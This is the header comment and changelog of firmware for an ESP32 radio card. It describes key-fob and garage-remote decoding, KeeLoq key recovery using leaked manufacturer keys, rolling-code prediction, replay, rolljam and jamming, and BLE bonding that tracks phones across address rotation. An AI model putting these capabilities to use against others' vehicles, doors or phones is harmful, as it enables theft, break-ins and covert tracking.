// ═══════════════════════════════════════════════════════════════════════════════
// FOBworks for SGP — firmware for the SGP Card Mini
// Version  : FOBworks for SGP v3.82
// Board    : May 2026 stock, ESP32-S3-MINI-1-N8, 8 MB flash, no PSRAM
// Radio    : CC1101, OOK and 2FSK, 300–928 MHz
// Dashboard: http://192.168.4.1; per-device Wi-Fi credentials are printed over USB
// Serial   : 115200 baud, JSON commands and events (see SERIAL COMMANDS)
// License  : GPL-3.0; see LICENSE.
// ───────────────────────────────────────────────────────────────────────────────
// The built-in dashboard has four modes. FOBscan is the general-purpose scanner;
// it handles capture, scanning, decode, prediction, key recovery, the signal library,
// replay, and BLE. FOBclone guides a user through collecting and reviewing signals
// for a vehicle profile. FOBcatch and FOBback are guided capture/replay sequences;
// their radio and counter checks are described in the sections below.
//
// The notes that follow are a quick map of the firmware, not a compatibility claim
// for every vehicle or board revision. See README.md for the tested board setup and
// the hardware limits that affect capture and transmission.
// ───────────────────────────────────────────────────────────────────────────────
//
// ── ROLLING-CODE PROTOCOLS ────────────────────────────────────────────────────
//   KeeLoq (HCS300/301/360/361/512/515)
//     · 64-bit hop encrypted with 32-bit device key derived from 64-bit MFR key
//     · 73 real manufacturer keys built-in (public leaked corpus + the public Kia
//       V3/V4 OEM key), each with its learning type; invented filler entries removed
//     · 10 key-derivation modes per MFR key (standard, inverted, byte-swap SN,
//       half-key mirror, normal-learn variants, standard decrypt, XOR-type1)
//       — 400 total combinations tried
//     · Automatic device-key extraction: emits device_key_hex + add_user_key hint
//     · KL_RECENT ring (last 5 frames) + key_probe command for offline key test
//     · Counter delta predictor: estimates next hop code window (±65536)
//     · Manchester-encoded KeeLoq variant auto-detected
//   CAME-12 (12-bit fixed rolling, CAME gate motors)
//   CAME-TWN30 (30-bit rolling, CAME TOP/TWN series)
//   FAAC-64 (64-bit rolling, FAAC gate systems)
//   Somfy-RTS (56-bit rolling, 433.42 MHz, window/blind motors; freq-gated to
//     432–434.8 MHz to prevent false positives at 315 MHz)
//   Nice-FLOR (Nice gate/garage rolling code; bit-entropy guard rejects noise)
//   Marantec-D (Marantec garage door, binary FSK rolling; eu433 guard)
//   Hörmann-HSM (BiSecur 868 MHz rolling, garage/gate)
//   Sommer (Sommer garage rolling code)
//   Beninca-TOGO (26-bit Beninca rolling)
//   Cardin-S449/S466 (Cardin rolling gate)
//   V2-Phox (V2 64-bit rolling)
//   Security+ 1.0 (Chamberlain/LiftMaster/Craftsman 40-bit rolling)
//   Security+ 2.0 (Chamberlain/LiftMaster 28-bit ternary rolling, two 62-bit Manchester packets)
//   DEA (DEA 40-bit rolling gate)
//   AN-Motors / Doorhan (24-bit rolling, CIS gate market)
//   CAME-24 (CAME gate 24-bit fixed code — added in v3.13)
//   Nice-FLO (Nice FLO 12-bit or 24-bit fixed code, TE=700/1400µs — v3.13)
//   FAAC-SLH (FAAC SLH 64-bit rolling, TE=255/595µs, structural decode — v3.13)
//   Phoenix-V2 (V2 Phoenix 52-bit rolling, TE=427/853µs, structural decode — v3.13)
//   CAME-Atomo (CAME Atomo 62-bit Manchester rolling, TE=600/1200µs — v3.13)
//   LinearDelta3 / ATA-ELSEMA (40-bit rolling, 433 MHz, Australian garage doors)
//   Subaru RKE (8-bit PWM rolling, 48-bit frame)
//   Mazda–Siemens VDO (8-bit rolling)
//   VAG pre-2004 (VW/Audi/Seat/Skoda 16-bit rolling)
//   Hyundai/Kia early (fixed-code RKE)
//   Hyundai Santa Fe 2013–16 / Solaris (TRW Hitag2-derived 8-bit rolling)
//   KIA/HYU V0 (61-bit OOK PWM, CRC8 poly=0x7F, rolling, 433.92 MHz)
//   KIA/HYU V1 (57-bit OOK Manchester, CRC4, rolling, 315/433 MHz)
//   KIA/HYU V2 (53-bit Manchester, CRC4, rolling, EU 433.92 MHz — v3.59)
//   KIA/HYU V7 (64-bit Manchester FM, CRC8 poly=0x7F init=0x4C, rolling, 433.92 MHz — v3.59)
//   Ford RKE V0 (80-bit Manchester OOK, 10-bit GF(2) CRC, 315/433.92 MHz — v3.59)
//   Subaru V2 (80-bit Manchester OOK, ~987 baud, 20-bit sequential counter, NA only:
//     2004–2011 Impreza; 2005–2010 Forester / Legacy / Outback; 2006 Baja — v3.60)
//   BMW CAS4 / VW Touareg (64-bit Manchester-encoded, structural decode only)
//   Chrysler / Dodge / Jeep (nibble-interleaved 4-bit counter + 8-bit rolling)
//   Toyota-Denso (dual-band 312/315 MHz, KeeLoq subtype; v3.19: RSSI falling-edge
//     lag compensated — LO tolerance ±50%, TE derived from HI pulses only;
//     v3.33: "too_short" confidence when cnt<80 (decoder loop never ran);
//     v3.34: added an SX1278 reset before capture, initially believing it freed
//     GDO0; later measurements showed the CC1101 GDO0 is not routed on this board.
//     Retries short captures because Toyota fobs send 3–5 frames per press;
//     a retry may catch a cleaner repetition.
//     v3.48: false-positive KeeLoq gate for Ch-B captures > 160 bits;
//     v3.49: phase-alignment fix (try ds and ds+1) + end-of-capture RSSI-tail
//     tolerance (accept if only b≥38 fails))
//
// ── FIXED-CODE PROTOCOLS ──────────────────────────────────────────────────────
//   PT2262-fixed (Princeton 24-bit OOK, ratio 1:3, common clone chips)
//   PT2262-Manchester (Manchester-encoded PT2262 variant, 315 MHz)
//   PT2240 (Princeton 20-bit variant)
//   EV1527 / OEM learning codes (20-bit addr + 4-bit data)
//   HT12E (Holtek 12-bit: 8-bit addr + 4-bit data)
//   Linear-10 (Linear/Nortek 10-bit DIP-switch gate; edge-count guard ≥100)
//   LD3 (FAAC LD3 / ATA 38–56-bit fixed, 433 MHz)
//
// ── DECODER GUARDS ────────────────────────────────────────────────────────────
//   Decoders check pulse width (cA), bit count (bLen), and timing ratio. A few also
//   have protocol-specific checks for noise seen in captures:
//   · FAAC-64: ones-count gate (25–75%), identical-byte SN reject, and
//     alternating-bit SN reject (popcount(SN ^ SN>>1) > 27 → noise artefact)
//   · Somfy-RTS: nibble-XOR checksum (1/16 residual false-positive rate)
//   · Nice-FLOR: bit-entropy gate (40–60% ones), both fields must be non-zero;
//     TE window tightened to 420–580 µs to exclude car-fob pulse trains
//   · Linear-10: cA ≥ 100 µs and bLen ≤ 24 cap prevent catch-all behaviour
//   · Marantec-D: eu433 guard (≥ 400 MHz) removes false positives at 315 MHz
//   · KeeLoq / Toyota / Chrysler / Subaru: frequency + ratio + TE guards;
//     KeeLoq preamble retry across multiple TE candidates resolves real-fob flips
//
// ── RF CAPTURE ────────────────────────────────────────────────────────────────
//   The scanner sweeps 39 configured channels across 300–928 MHz. A saved range
//   narrows the sweep; locking a frequency pins it to ±0.15 MHz. Capture measures
//   the noise floor before setting its trigger and edge thresholds, then filters
//   glitches and incoherent bursts before decoding (18 clean edges minimum).
//   A capture lasts up to three seconds and stores at most 512 edges.
//
// ── AUTO-SCAN & SQUELCH ──────────────────────────────────────────────────────
//   Auto-scan visits the configured channels and captures above the -55 dBm
//   squelch setting (adjustable at runtime). Weaker hits are reported without a
//   full capture. OOK noise is hidden from scan events; duplicate decodes of the
//   same burst are suppressed.
//
// ── SIGNAL LIBRARY ───────────────────────────────────────────────────────────
//   Fixed-code decoders use their code or address as the serial number, so repeated
//   captures from the same fob can be grouped in the library.
//
// ── REPLAY & PREDICTION ──────────────────────────────────────────────────────
//   Replay can send a saved capture, or—where the decoder supports it—build a
//   predicted frame from the observed counter delta. Sequence mode advances through
//   a configured range of predicted frames.
//
// ── KEY MANAGEMENT ────────────────────────────────────────────────────────────
//   · 16 user-defined KeeLoq device keys stored in NVS (survives power cycle)
//   · add_user_key / del_user_key / key_list / key_clear serial commands
//   · key_recover: exhaustive 40-key × 10-mode device-key search across captures
//   · key_probe: test any candidate key against last 5 captured frames instantly
//     (no re-capture needed); returns confidence level + save_hint JSON
//
// ── BLE SCANNER (ESP32-S3 built-in 2.4 GHz radio) ────────────────────────────
//   The firmware uses the ESP32-S3's integrated Bluetooth radio (independent of
//   the CC1101 RF front-end) to scan for and bond with nearby BLE devices.
//   Available via the WiFi AP dashboard BLE panel and HTTP API.
//
//   Passive advertisement scan (/api/ble_scan?duration=N, N=1–30 s):
//     · Non-blocking; returns {"status":"scanning"} immediately.
//     · Records up to 20 nearby BLE advertisers: MAC address, device name, RSSI,
//       service UUIDs, manufacturer data (first 16 bytes as hex).
//     · Device fingerprinting by UUID / name pattern identifies known car-security
//       and smart-lock systems: Tuya Smart, TTLock, Pandora Mini BT,
//       Compustar/DroneMobile, Yale Access, Compustar InvisiKEY, Viper SmartStart,
//       KARR Security, iDatalink/Compustar.
//     · Poll /api/ble_results for device list + status (scanning / ready / idle).
//
//   BLE pairing / IRK bonding (/api/ble_pair_start):
//     · Advertises the device as a GATT server ("SGP Card Mini") so a phone can
//       initiate a BLE bond.  Uses ESP_LE_AUTH_BOND with no-PIN Just Works pairing.
//     · On successful bond the ESP32 BLE stack stores the peer's IRK (Identity
//       Resolving Key) in NVS flash automatically.
//     · iOS and Android 10+ rotate BT addresses every ~15 min (Resolvable Private
//       Address / RPA); the stored IRK lets the firmware call
//       esp_ble_resolve_random_addr() on future scans to identify the bonded phone
//       even after address rotation — enabling passive proximity tracking.
//     · /api/ble_pair_status — poll pairing state and elapsed time.
//     · /api/ble_pair_stop  — stop GATT advertising.
//     · /api/ble_paired_devices — list non-secret metadata for bonded devices.
//
// ── WIFI AP DASHBOARD ─────────────────────────────────────────────────────────
//   Connect using the per-device credentials printed over USB serial. The
//   dashboard opens automatically via DNS captive portal on iOS / Android.
//   Manual URL: http://192.168.4.1
//
//   · Live Signal Library — all decoded captures grouped by protocol + serial
//       - Per-group: counter sequence, RSSI bar, rolling-code validity badge
//       - Signal rows: hover to remove from group or delete from library
//       - Manual groups: user-defined fob groupings with custom labels
//       - Saved Fobs: named bookmarks pinned to auto-groups with rename/remove
//   · Group-level merge analyzer — 5-minute background scan identifies captures
//       from the same physical fob decoded inconsistently; one-click MERGE ALL
//       using union-find transitive merging; merge cards dismissible per-pair
//   · KeeLoq Key Recovery — exhaustive 40-key × 10-mode device-key search;
//       recovered key shown with confidence, auto-save to NVS via add_user_key
//   · Replay controls — replay last, replay predicted next, replay range,
//       dual-series A/B replay for compare captures; live replay state overlay
//   · Frequency & scan controls — setfreq, squelch slider, scan pause/resume
//   · Signal selector — checkbox multi-select for bulk manual-group creation
//   · Sort + filter — by recent / hits / frequency / protocol; band filter;
//       type filter (rolling / fixed / unknown); vehicle make search
//   · Hide OOK-raw toggle — one click suppresses unclassified noise bursts
//       from the library view (toggle turns red when active)
//   · Export JSON — download entire signal library + manual groups as a
//       timestamped .json file for offline analysis
//   · BLE Scanner panel — passive BLE advertisement scan (1–30 s); shows up to
//       20 nearby devices with MAC, name, RSSI, service UUIDs, manufacturer data,
//       and auto-identified system label (Pandora, Compustar, Yale, Tuya, etc.)
//   · BLE Pairing panel — advertise as GATT server ("SGP Card Mini") so a phone
//       can bond; stores peer IRK in NVS for subsequent RPA address resolution
//   · Ungrouped / raw capture panel — OOK-raw and single-hit signals
//   · Clean Up Groups — atomic deduplication of signal IDs across all groups
//   · Battery, uptime, scan stats, RSSI waterfall in status bar
//   · localStorage persistence — signal library + manual groups survive refresh
//     (raw_bits and predicted_next stripped to stay within quota; cap 300 signals)
//
  // ── CHANGELOG ─────────────────────────────────────────────────────────────────
  // v3.82 (2026-09-30) — hold the LoRa module in reset, which stops the false captures.
  //
  //   [BUG] The card fired captures with NOTHING transmitting, at bands no consumer device
  //     uses and with a floor of -101 dBm. The source was the SX1278: setup() raises the 3.3 V
  //     sensor rail, which also powers LoRa, and nothing on the normal boot path put the module
  //     to sleep -- the only loraHardReset() calls are inside captureSignal(), so between boot
  //     and the first capture it sat powered and awake on the shared front end.
  //
  //     Measured at 700 MHz with nothing transmitting: floor -101/-102 dBm and 3 of 3 false
  //     captures with the module awake; floor -112 dBm and 0 of 3 with RST held LOW. A capture
  //     fires when RSSI crosses trigThr, which is floor+10, so the 11 dB moved the trigger from
  //     -91 to -102 and the module's own noise stopped crossing it.
  //
  //     loraParkReset() deselects CS and holds RST LOW, in setup() after the rail comes up and
  //     in captureSignal() after the existing reset. Holding RST low is the vendor's own
  //     documented lowest-power state ("LoRa RST -> hold LOW"); the previous code relied on the
  //     SPI sleep register and released RST. That write DID land -- loraSleepNow() reads
  //     RegOpMode back and it reports 0x00 -- so this was the wrong state, not a failed write.
  //     The SPI reset still runs first, because it is what guarantees DIO0 goes high-Z and
  //     GPIO 48 is shared with the CC1101.
  //
  //     Clearest indicator: every capture used to report raw=512, the buffer filling on LoRa
  //     noise faster than any modulation. A real signal now reports raw=34.
  //
  //   [NOT FIXED] 433.92 still fires with nothing transmitting, and 868.35 fires 2 of 3.
  //     433.92 reads -81 dBm where every other band reads -101, a 20 dB difference no on-board
  //     source explains. That is the signature of real local RF in a dense building on the
  //     busiest ISM band, so it is recorded as probably environmental rather than a defect.
  //     Whether the card should capture on ambient RF at all is open as a design question.
  //
  //   research/55 records the measurements. This also explains research/49's headline: what
  //   "worked" at 433.92 included ambient and LoRa noise, so that comparison was never
  //   measuring the capture path.
  //
  //   Compile: 1,775,112 B flash of 3,145,728 (56%), 149,764 B RAM of 327,680 (45%).
  //   All 18 suites pass.
  //
  // v3.81 (2026-09-30) — the FSK noise floor is an AGC target, not a dead radio.
  // See research/48.
  //
  //   [FINDING] research/47 left the FSK floor reading ~15 dB below the OOK one
  //     (-100 vs -86 dBm), and a -100 dBm reading is what a CC1101 returns when it
  //     is not receiving. That mattered because captureSignal() derives its trigger
  //     from it (trigThr = floor + 10).
  //
  //     The chip is receiving: MARCSTATE stays 13 (RX) through the FSK writes and
  //     every later phase. The two figures were never comparable, because
  //     AGCCTRL2.MAGN_TARGET names a target by index against TWO tables, one for
  //     OOK/ASK and one for 2-FSK/GFSK/MSK. This configuration carries the OOK value
  //     (0x43 -> MAGN_TARGET=3) into FSK.
  //
  //     Measured, sweeping the field in FSK across all eight values: the floor moves
  //     from -85 to -101 dBm. At MAGN_TARGET=0 the FSK floor is -85.5 dBm, identical
  //     to the OOK floor. The rule the reference implementation states -- "MAGN_TARGET
  //     for RX filter BW =< 100 kHz is 0x3. For higher RX filter BW's MAGN_TARGET is
  //     0x7" -- is consistent with this: the board runs a 406 kHz filter carrying 0x3.
  //
  //     Not changed: the MAGN_TARGET value itself. Which index the datasheet intends
  //     for a 406 kHz FSK filter is not something the bench can settle without a
  //     signal source, and 0 is the most sensitive target -- picking it because it
  //     makes the two modes agree would be fitting the number to the appearance.
  //
  //   [DIAG] rx_floor_check now reports magn_target_sweep_fsk, so the field's influence
  //     is visible on the card in one command, and its note no longer claims the floor
  //     is implausible. The FLOOR_UNREALISTIC verdict still fires below -90 dBm but the
  //     note now says what that means.
  //
  //     A fourth phase reading the floor in IDLE was tried and removed: RSSI is not
  //     maintained in IDLE, so it returns a stale register and the samples jumped
  //     between -86 and -99 across runs. Recorded in research/48 §4 rather than left in.
  //
  //   Compile: 1,771,164 B flash, 149,764 B RAM. All 18 suites pass.
  //
  // v3.80 (2026-09-30) — the noise-floor diagnostics were measuring the sweep, not
  // the radio. See research/47.
  //
  //   [BUG] rx_floor_check and rssi_path_check gave a different answer on every run,
  //     including two different verdicts from the same command. Three runs with the
  //     scan active returned floors of -85, -108 and -100 dBm, and MARCSTATE read 1
  //     (IDLE) on one run and 13 (RX) on the next.
  //
  //     Two faults, both in the diagnostics rather than the radio:
  //
  //     · Neither paused the background sweep. scanTick() runs after handleSerial()
  //       in loop() and retunes the chip on its own schedule, so each invocation
  //       began from whatever state the previous sweep tick left behind. The loop is
  //       single-threaded, so this is not a race inside the handler -- it is the
  //       starting state that varied.
  //     · Neither allowed the chip to settle between strobes. captureSignal() uses
  //       `0x36; delay(1); 0x3A; delay(1); 0x34; delay(10)`; the diagnostic ran the
  //       same three strobes back to back and then read MARCSTATE before the
  //       transition to RX had landed. With the sweep paused, `after_srx` reported
  //       IDLE every time and only reached RX after a later strobe pair that did
  //       carry the 1 ms gap.
  //
  //     Both diagnostics now pause the sweep and use captureSignal()'s timing
  //     verbatim. Four consecutive runs with the sweep active are identical, and the
  //     first MARCSTATE reading is 13 as it should be.
  //
  //   [BUG] The same missing sweep guard was on four direct-transmit handlers:
  //     `replay`, `fbk_replay`, `rolljam_replay` and `play_key`. A sweep tick between
  //     the command and the burst could retune the CC1101 out from under it. All four
  //     now pause and restore. The sequencers (rbStart, rjStart, startJam) and the
  //     capture/replay_seq/dual_band_replay paths already did this.
  //
  //     The /api/* twins of several of these are still unguarded. Not changed here:
  //     the serial paths are what the bench exercises and what the host suite covers,
  //     and the HTTP change has no bench evidence yet. Recorded in research/47 §3.
  //
  //   Compile: 1,770,476 B flash, 149,764 B RAM. All 18 suites pass.
  //
  // v3.79 (2026-09-29) — a stored frame can be imported even when its protocol has no trim.
//
//   [BUG] fbk_import refused any body that rjTrimKiaV34 could not bound, so only Kia V3/V4
//     format captures could ever be imported. rjTrimKiaV34 looks for the 162-pulse Kia
//     repeat by construction, so a Toyota, CAME, Nice or Ford body can never satisfy it --
//     the import path was therefore narrower than the docs implied, and it blocked loading
//     the one family the bench actually needs (research/43).
//
//     fbkAppend already keeps the raw block when the trim finds nothing ("a wrong trim is
//     worse than a long one, because the decoder can still find a frame inside a
//     multi-repeat block"), so this makes the import path agree with the capture path
//     instead of being stricter than it. The kept body is capped to CAP_SZ, which is what an
//     FbkEntry holds, and an import_kept_raw event reports it rather than accepting silently.
//
//     The safety property is unchanged and still asserted: rbArm refuses an untrimmed block
//     (both the HTTP and serial paths), so C2 cannot transmit a multi-repeat body as if it
//     were a single press. Only storage changed, not what is allowed to fire.
//
//   [TEST] test_fbk_import.py previously asserted the refusal; it now asserts the guard that
//     matters -- trimmed=false is recorded, rbArm refuses it, and the keep is reported.
//
// v3.78 (2026-09-29) — ks_decodeToyota was unreachable on its own captures.
//
//   [BUG] The decoder fired on 12 foreign captures (Ford, Tesla, Kia, VW) while decoding
//     none of its own 62 Toyota/Lexus captures. The dispatch guard was an inverted ceiling:
//     `te_toy && ratio<=2.5` (and `ratio<=3.0` on the Ch-B path). A Toyota capture that
//     contains data measures ratio 6.6-13.2, because the data region mixes 1T and 2T HI
//     pulses with long inter-bit LO gaps while the equal-width preamble collapses toward
//     1.0; the foreign files measure ~2.0. So the ceiling admitted the aliased population
//     and excluded the brand the decoder serves. The guard is now `ratio>=3.5`. Foreign
//     fires fall 12 -> 5, own-brand decodes rise 0 -> 2, and the decoder is now reachable
//     on 39 of 62 own-brand captures instead of zero.
//
//     The v3.53/v3.54 comments claimed the ceiling "cleanly separates the two populations"
//     with real Toyota below 3.0 and aliasing above. The measurement is the other way round.
//
//   [BUG] The preamble minimum was 3, against this decoder's own documented 8, with a note
//     asserting that 3 prevents false positives. Measured, it does the opposite: restoring 8
//     keeps the identical own-brand result and cuts the foreign hits from 8 to 5. Recorded
//     caveat: only 2 of 64 captures reach 8 detectable pairs, because a modern fob's preamble
//     is short, so 8 would exclude genuine short-preamble fobs if the data stage were fixed.
//
//   [NOT FIXED] The data stage still resolves only 2 of the 62 captures, and emits several
//     inconsistent frames per capture. That needs a correctly-scaled capture; the corpus
//     scaling is unreliable (research/38). Also noted for later: the entropy gate accepts up
//     to 32 transitions in 39 bit-pairs, and 82% is close to alternating noise, so its upper
//     bound can be tightened well below 32 with no risk to real frames.
//
//   [TEST] test_toyota_reachability.py asserts the DISPATCH condition as well as the decode,
//     so it cannot pass by moving the decoder further out of reach.
//
//   Compile: 1,775,184 B flash of 3,145,728 (56%), 149,580 B RAM of 327,680 (45%).
//   All 18 suites pass.
//
// v3.77 (2026-09-29) — the two decoder false positives the corpus regression surfaced.
//
//   [BUG] ks_decodeKiaV2 rejected every genuine KIA/HYU V2 frame and accepted a family of
//     noise instead. The CRC4 formula was missing its final + 1. Two genuine KIA/HYU V2
//     payloads in the corpus (Hyundai_V2_N1, Hyundai_V2_Random_Habar) satisfy
//     (xor of the twelve data nibbles + 1) & 0x0F and fail without the + 1, while the seven
//     Tesla 433.92 MHz captures this decoder used to fire on satisfy only the old form. The
//     two sets are disjoint, so the one operator both validates real frames and removes the
//     false positives. This was not a loose tolerance: the decoder was stricter than the
//     protocol, so it could not have decoded a real V2 fob at all. The reference
//     implementation computes the same (crc + 1) & 0x0F.
//
//   [BUG] ks_decodeFordV0 fired on three VW Polo 434.42 MHz captures. Its 80-bit window
//     slides into the long unmodulated tail those captures end on, and the CRC7 of a
//     constant run passes by construction: 136 passing offsets per file, every one with 0 or
//     1 bit transitions across the window, against roughly 50 for a real frame. Windows
//     below 8 transitions are now rejected. The floor is set at "modulated at all" rather
//     than just above the observed value, so no real frame can reach it.
//
//   Neither fix narrows a pulse-geometry tolerance, so neither depends on capture scaling,
//   which matters because the corpus scaling is unreliable (research/38).
//
//   [FIX] The band remark in research/37 §4.1 is a red herring: te_kv2 requires eu433, so
//     433.92 MHz is the correct band for the EU V2 variant and the band gate was working.
//
//   [DOC] research/39 records the investigation; research/36 §3.3 and research/37 §6 carry
//     corrections, because both described these as "too-permissive validation" when the
//     KiaV2 cause was an incorrect check rather than an absent one.
//
//   [TEST] test_decoder_false_positives.py runs the shipped decoders over the real captures
//     and asserts the old formula DID fire on every Tesla file, and that both gates are open
//     on every test file, so neither assertion can pass vacuously.
//
//   Compile: 1,775,180 B flash of 3,145,728 (56%), 149,580 B RAM of 327,680 (45%).
//   All 17 suites pass.
//
// v3.76 (2026-09-28) — an out-of-bounds read in the WebSocket slot table, and a test that
//   could not compile outside clang.
//
//   [BUG] The generation lookup in the WebSocket handler was written as an argument:
//
//           wsEnqueue(line, slot, wsSlotMatches(slot, wsGen[slot]) ? wsGen[slot] : 0);
//
//     An argument is evaluated before the call, so wsGen[-1] was read before
//     wsSlotMatches() could apply its own slot >= 0 check. The case is reachable: a fifth
//     connection evicts slot 0, and if that evicted socket then sends a frame, wsSlotFor()
//     no longer finds its fd and returns -1. Confirmed under UBSan, which reports
//     "index -1 out of bounds for type 'uint32_t[4]'" for the old form and nothing for the
//     guarded one. The guard now sits inside the expression, where short-circuiting
//     protects the index.
//
//   [TEST] test_hexstr_bounds.py sized a static array with a value that is not a constant
//     expression in C, making it a variable length array. clang folds it with a warning;
//     GNU gcc rejects it, so the suite could not compile there and was covering nothing on
//     that toolchain. The size is now a preprocessor constant.
//
//   Compile: 1,775,192 B flash of 3,145,728 (56%), 149,580 B RAM of 327,680 (45%).
//   All 16 suites pass; the new assertion was mutation-tested.
//
// v3.75 (2026-09-28) — follow-ups to the v3.74 review.
//
//   [CAPTURE] A timed-out capture could leave capMaxMsOverride set, giving the next
//     capture an unintended 250 ms recording window. The budget is now consumed as
//     soon as captureSignal() reads it, so every exit path sees the same one-shot value.
//
//   [SECURITY] A queued WebSocket reply could reach a new client if the original client
//     disconnected and its slot was reused. Replies now carry the slot's generation and
//     are dropped unless the slot still belongs to the authenticated requester.
//
//   [CAPTURE] GPIO 48 is the SX1278's DIO0 on this board, not the CC1101's GDO0.
//     Capture now uses the digital path only when gdo0Routed is set, as jam and replay
//     already do. Otherwise it falls back to RSSI readings from the CC1101.
//
//   [DOC] README.md and CITATIONS_AND_REFERENCES.md now identify v3.75.
//
//     The Ch-B fallback now waits up to 3000 ms for a signal, then records for 250 ms.
//     That timing is intended to catch the end of a press, but has not been measured on
//     the card.
//
//   Compile: 1,774,912 B flash, 149,580 B RAM. All 16 suites pass; the new assertions
//   were mutation-tested.
//
// v3.74 (2026-09-27) — fixes for four v3.73 review findings.
//
//   [SECURITY] The token check protected command execution, but not WebSocket broadcasts:
//     unauthenticated clients could still receive decode results and replies. A slot is now
//     marked authenticated only after a valid token, broadcasts skip other clients, and
//     command replies go only to the client that sent the command.
//
//   [TX] GPIO 48 toggling does not prove a CC1101 connection; it is the SX1278's DIO0,
//     while the CC1101's GDO0 is not routed on this board. Jam and replay now use packet
//     mode by default, and select async mode only when gdo0Routed is set on a board with
//     a wired GDO0. Resetting or sleeping the SX1278 does not change this wiring.
//
//   [CAPTURE] timeoutMs limits how long to wait for a signal; it did not limit the
//     recording itself, which was fixed at three seconds. A separate one-shot
//     capMaxMsOverride now limits edge recording. Existing callers keep the 3 s default.
//
//   [API] /api/can_send now accepts only 1–8 hex digits for ?id= and returns the parsed
//     value in canonical form. Previously strtoul accepted a valid prefix such as
//     "7DF" in "7DFZZZ", and the response echoed the unescaped input.
//
//   Static checks and mutation tests are in test_review_v373_fixes.py. Runtime checks need
//   two WebSocket clients and a board with GDO0 routed.
//
// v3.73 (2026-09-27) — add the Wi-Fi WebSocket transport.
//
//   [BUG] The Wi-Fi dashboard connects to ws://<ap-ip>:81, but the firmware only
//     served HTTP on port 80. The device was reachable; there was no WebSocket server.
//
//   [WS] Port 81 now uses esp_http_server, since Arduino WebServer cannot upgrade a
//     connection. USB and Wi-Fi share processCommandLine():
//       · inbound  : httpd handler -> wsEnqueue() -> wsPump() (in loop()) -> processCommandLine()
//       · outbound : serialEmit() -> wsBroadcast()  (every existing event, no per-event work)
//
//   [REFACTOR] The command chain moved from handleSerial() to
//     processCommandLine(const String&). The 67-command set was unchanged.
//
//   [THREADING] The HTTP handler runs on a FreeRTOS task. It queues inbound commands
//     for wsPump() to execute from loop(); running them in the handler would break the
//     firmware's single-loop-task assumption. Outbound frames use the async send API.
//
//   [GUARD] Frames are limited to WS_LINE_MAX (2048 bytes); oversized frames are rejected.
//     The four-entry queue drops commands when full, and wsPump() handles only a bounded
//     number per loop pass so socket traffic cannot starve capture or scanning.
//
//   [COST] The queue (4 × 2048 B) and receive buffer (2048 B) add 10,256 B of static
//     storage. Measured RAM use rose from 139,420 to 149,700 B; flash use from 55% to 56%.
//
//   Wi-Fi uses the same access code as USB; both transports reach the same token gate.
//
// v3.72 (2026-09-26) — add packet-mode TX, which does not use GDO0.
//
//   [FINDING] GPIO 48 is the SX1278's DIO0; the CC1101's GDO0 is not routed to a
//     readable ESP32 pin. Pin 48 stayed low with the CC1101 tri-stated and the SX1278
//     asleep or in reset. Removing sensor-rail power freed it, but that rail also powers
//     the CC1101. The vendor firmware reports the same missing GDO0 connection.
//
//   [TX] Packet mode sends through the TX FIFO and does not need GDO0. Added
//     cc_writeBurst(), cc_txPacket(), and cc_txCarrier(); an external receiver decoded
//     a transmitted frame.
//
//   [BUG] A drained FIFO did not prove that the radio transmitted. OOK needs both
//     PATABLE entries set; the old single-byte write left logic 1 at zero power.
//     A burst write now sets {0xC0,0xC0}, and pa_check verifies the values.
//
//   [BUG] MARCSTATE 19 and 20 indicate TX; 17 is RXFIFO_OVERFLOW. The TX FIFO holds
//     64 bytes, so larger writes must be split across bursts.
//
//   [C1] The FIFO carrier uses 64-byte 0xFF packets at about 8.9 kBaud. jamTick() refills
//     them from loop(); overfilling the FIFO caused roughly one carrier gap per second.
//     jam_status reports underruns and the longest loop gap.
//
//   [GUARD] The first replay path toggled GPIO 48 to check for async TX, but that pin
//     belongs to the SX1278 and is not proof of a CC1101 connection. The check could
//     report a successful replay when nothing was sent. The v3.72 implementation added
//     a TX-state check; v3.74 later replaced pin-based path selection with gdo0Routed.
//
//   [GUARD] The RSSI fallback polls at roughly 1600 µs, too slowly to resolve short
//     Kia V3/V4 pulses. Captures with no bit edges now fail with "no-bit-edges" instead
//     of being passed to a decoder as a valid frame.
//
//   [DIAG] Added gdo0_probe, gdo0_isolate, lora_sleep_check, lora_rst_check,
//     gdo0_rail_test, tx_fifo_test, tx_carrier_test, pa_check, and jam_status. Readbacks
//     and reference-pin checks make each result easier to verify.
//
// v3.71 (2026-09-26) — a capture is now trimmed to ONE frame (research/11 F2/F5/F4).
//
//   [BUG] A capture buffer entry was several repeats of one code, not one code.
//     captureSignal fills CAP_SZ=512 pulses and a press emits its frame repeatedly,
//     so one block held ~3 repeats. Both C1's replay and C2's two-code sequence then
//     transmitted 3 presses instead of 1. The v3.70 claim that RJ_CAP_GAP_US bounded
//     the capture at the frame was wrong: the 100 ms floor in the exit condition was
//     not parameterised, so an 8 ms gap was unreachable, and 8 ms is not the frame
//     boundary anyway — the measured gap distribution is smooth and decaying with no
//     separator there.
//
//   [F2] klTrimToFrame() isolates one frame from a captured block, applied at both
//     storage points: fbkAppend() (so C2's entries are single codes) and each rjTick
//     capture (so C1's replay sends one press). Trimming after capture rather than
//     bounding the capture is the right shape: the capture path cannot see the whole
//     burst, and the reference corpus stores fixed 512-pulse blocks, which is evidence
//     that a reliable time boundary is not detectable mid-capture for this protocol.
//
//     The locator is the REPEAT PITCH, not merely a wide pulse. Two weaker rules were
//     tried against the real capture and both locked onto noise — the first wide pulse
//     (the head has >1000 us pulses at 3/5/9/11) and two-equal-intervals (picked
//     139/123/101-pulse noise gaps, 22/65 wrong in the first 20k pulses). Requiring a
//     separator followed by another almost exactly one pitch later decodes 59/60.
//     A wrong trim is worse than a long block, so the caller keeps the raw block when
//     no frame is found.
//
//   [F5] test_frame_trim.py validates this against a real RF capture. It runs the
//     shipped trim AND the shipped Kia decoder over KIA V3 N1 RAW.sub: 161 frames
//     emitted, 151 decode (93.8%), lengths cluster at 183/182 (156/161), counters
//     advance 38..49. A blind walk drifts out of phase at burst edges, which is why
//     the decode rate is 93.8% rather than 100; the firmware trims once from a known
//     burst head. 5/5 mutants caught, including the two locator rules that fail.
//
//   [F4] test_rolljam_exec.py's capture mock is now faithful: it honours timeoutMs and
//     gapUs, records them, and emits a realistic multi-repeat block. The previous mock
//     ignored both parameters and supplied a buffer the test author chose, which is
//     why it could not observe any of this. Both C1 and C2 tests now assert the stored
//     length is one frame, and a removed trim is caught.
//
//   [F1/F3 not done] The bounded-capture route is left alone. Removing the 100 ms floor
//     would not make RJ_CAP_GAP_US correct (it is not the boundary), and a single
//     constant cannot serve protocols whose frame boundary differs by orders of
